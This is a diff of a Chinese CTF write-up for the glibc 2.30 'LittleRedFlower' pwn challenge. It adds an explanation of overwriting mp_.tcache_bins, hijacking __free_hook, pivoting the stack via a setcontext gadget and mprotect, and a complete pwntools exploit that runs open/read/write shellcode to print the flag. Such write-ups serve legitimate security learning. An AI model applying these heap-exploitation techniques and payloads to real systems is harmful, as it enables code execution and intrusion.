@@ -581,7 +581,7 @@ if __name__ == '__main__':
 > - 最后：牛魔，调昏了，调了一天，但是收获很多之前不知道或没注意的小trick
 
 
-### LittleRedFlower (Attack MP.tcache_bins即TCACHE_MAX_BINS)
+### LittleRedFlower (Attack mp_.tcache_bins)
 
 > [!版本] glibc 2.30
 
@@ -681,10 +681,115 @@ libc没调试信息找不到一点，只能从ida里硬翻：
 
 但是仍然有一个问题，free_hook所在的位置并没有执行权限，如果我们想要使用mprotect给该位置上权限，又离不开用栈传参。
 
-##### hook如何进行orw
+##### 在劫持完hook之后
 
-欸，我这里有个神奇妙妙工具：
+使用`setcontext`将栈迁移到可控位置，从而能够进行传参
+
+`setcontext`在2.29之后变为由`rdx`进行索引，所以在hook处我们要先找gadget进行rdi与rdx的转换
+
+> [!hint] 搜集一些万金油gadgets  
+
+神奇妙妙工具其1：`0x154b20` libc 2.30
+```asm
+mov rdx, qword ptr [rdi + 8];
+mov qword ptr [rsp], rax;
+call qword ptr [rdx + 0x20]; 
+```
+
+`rdi`存有chunk ptr，将其传给`rdx`，再通过`setcontext`中的gadgets进行栈迁移
+
+##### 最终的exp
 
 ```python
-
+import logging  
+  
+from pwn import *  
+  
+context(arch='amd64', os='linux', log_level='debug')  
+  
+local = 1  
+binary_path = './pwn'  
+gdb_script = "b *$rebase(0xff5)\n"  
+gdb_script += "b mprotect\n"  
+gdb_script += "c\n"  
+domain = "node5.buuoj.cn"  
+port = 25042  
+global io, gdb_io  
+elf = ELF(binary_path)  
+libc = elf.libc  
+  
+  
+def connect(isLocal, isGDB, isIO):  
+    if not isLocal:  
+        io = remote(domain, port)  
+        return io  
+    elif isGDB:  
+        if isIO:  
+            io = process(binary_path)  
+            (pid, gdb_io) = gdb.attach(io, gdb_script, api=True)  
+            return io, gdb_io  
+        else:  
+            io = gdb.debug(binary_path, gdb_script)  
+            return io  
+    else:  
+        io = process(binary_path)  
+        return io  
+  
+def getGift(io):  
+    io.recvuntil("GIFT: ")  
+    stdout_addr = eval(io.recv(14))  
+    libc_base = stdout_addr - libc.sym['_IO_2_1_stdout_']  
+    return libc_base  
+def attack():  
+    io = connect(isLocal=False, isGDB=True, isIO=False)  
+    libc_base = getGift(io)  
+    mp_tcache_addr = libc_base + 0x1ea2d0  
+    log.info("libc:" + hex(libc_base))  
+    io.sendafter(b"You can write a byte anywhere", p64(mp_tcache_addr + 1)) #0xff40大小  
+    io.sendafter(b"And what?", p8(0xff)) #这里不是p8的话，多出来的\x00会被后续offset读入  
+    target = 0x1088  
+    offset = target - 0x2a0  
+    io.sendlineafter(b"Offset:", str(offset))  
+    free_hook = libc_base + libc.sym["__free_hook"]  
+    io.sendafter(b"Content:", p64(free_hook))  
+    io.sendlineafter(b"size", str(0x2000))  
+  
+    orw = shellcraft.open("./flag")  #注意flag的位置
+    orw += shellcraft.read(3, free_hook+0x1500, 0x50)  
+    orw += shellcraft.write(1, free_hook+0x1500, 0x50)  
+  
+    #将0x2000的chunk分为四个区域：  
+    # gadgets区，用于栈迁移与流程控制，以及进行mprotect  
+    # fake_stack区，用于伪造的stack  
+    # shellcode区，用于执行最终的orw  
+    # 缓冲区，用于存放读入的flag  
+  
+    mprotect = libc_base + libc.sym["mprotect"]  
+    addr_shellcode = free_hook + 0x1000  
+    fake_stack = free_hook + 0x500  
+    #原理就是利用类似setContext与sigreturn之类的设置上下文函数实现寄存器控制  
+    setcontext = libc_base + libc.sym["setcontext"] + 61  # 2.30,2.31均为+61 2.29为+53  
+    sigFrame = SigreturnFrame()  
+    sigFrame['uc_stack.ss_size'] = setcontext #正常可以是sigReturn 这里从arttnba3师傅学的  
+    sigFrame.rip = mprotect  
+    sigFrame.rdi = free_hook - 0xb20  
+    sigFrame.rsi = 0x3000  
+    sigFrame.rdx = 7  
+    sigFrame.rsp = fake_stack  
+  
+    gadget1 = libc_base + 0x154b20  
+  
+    payload = (p64(gadget1) + p64(free_hook+0x28)).ljust(0x20,b'\x00')#索引rdx要指向sigframe的基址  
+    payload += p64(setcontext) #跳转到setcontext的Gadget开始执行。放在SROP中相当于执行sigReturn  
+    payload += bytes(sigFrame)  
+    payload = payload.ljust(0x500,b'\x00') #fake_stack区  
+    payload += p64(addr_shellcode)  
+    payload = payload.ljust(0x1000,b'\x00')#shellcode区  
+    payload += asm(orw)  
+  
+    io.sendlineafter(b">>", payload)  
+    io.interactive()  
+  
+if __name__ == '__main__':  
+    attack()
 ```
